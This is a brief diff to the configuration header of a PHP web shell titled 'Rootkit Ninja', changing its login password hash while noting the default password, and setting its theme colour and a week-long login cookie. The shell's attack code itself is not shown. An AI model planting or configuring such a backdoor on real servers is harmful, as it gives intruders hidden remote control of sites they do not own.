@@ -7,7 +7,7 @@ error_reporting(0);
 @clearstatcache();
 
 $s_title = "Rootkit Ninja"; // shell title
-$s_pass = "8ea5826700d709439efe49b8a6c3cb54"; // default : rootkitninja
+$s_pass = "345bb5bb5afdf88fd3c7fe77cb245cb2"; // default : rootkitninja
 $s_color = "9d1920"; // shell theme color, default : 4c83af
 $s_login_time = 3600 * 24 * 7; // cookie time (login)
 
